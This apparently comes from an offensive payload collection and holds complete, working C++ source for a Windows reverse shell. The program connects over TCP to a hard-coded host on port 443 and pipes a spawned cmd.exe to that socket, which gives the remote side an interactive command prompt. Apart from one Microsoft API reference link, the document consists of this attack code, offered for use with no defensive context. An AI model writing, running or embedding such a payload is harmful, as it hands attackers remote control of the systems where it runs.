# CPP

```cpp
#include <iostream>
#include <cstdlib>
#include <winsock2.h> // This must come before windows.h to avoid collision with winsock.h
#include <windows.h>
#include <ws2tcpip.h> // Must include this

#pragma comment(lib, "ws2_32.lib")

#define SERVER "192.168.1.2"
#define PORT 443

int main() {
	SOCKET socket;
	sockaddr_in socket_address;
	WSADATA windows_socket_api_data;
	STARTUPINFO startupinfo;
	PROCESS_INFORMATION process_information;
	char receive_server[512];
	int connection;
	char ip_address[] = SERVER;
	int port = PORT;

	// Initialize WinSock
	::WSAStartup(MAKEWORD(2, 2), &windows_socket_api_data);

	// Create a TCP socket
	socket = ::WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL);

	socket_address.sin_port = htons(port);
	socket_address.sin_family = AF_INET;
	socket_address.sin_addr.s_addr = inet_addr(ip_address);

	// Connect to the target server
	connection = ::WSAConnect(socket, (SOCKADDR*) &socket_address, sizeof(socket_address), NULL, NULL, NULL);
	if (connection == SOCKET_ERROR) {
		std::cout << "[!] Connection to the target server failed, please try again!" << std::endl;
		std::exit(0);
	} else {
		recv(socket, receive_server, sizeof(receive_server), 0);

		memset(&startupinfo, 0, sizeof(startupinfo));

		startupinfo.cb = sizeof(startupinfo);
		startupinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
		startupinfo.hStdInput = startupinfo.hStdOutput = startupinfo.hStdError = (HANDLE) socket; // Pipe std input/output/err to the socket

		::CreateProcess(NULL, "cmd.exe" , NULL, NULL, TRUE, 0, NULL, NULL, &startupinfo, &process_information); // Spawn command prompt

		::WaitForSingleObject(process_information.hProcess, INFINITE);

		::CloseHandle(process_information.hProcess);
		::CloseHandle(process_information.hThread);

		memset(receive_server, 0, sizeof(receive_server));
	}
}
```

---
## References

### Microsoft

- [Microsoft: `recv`](https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv)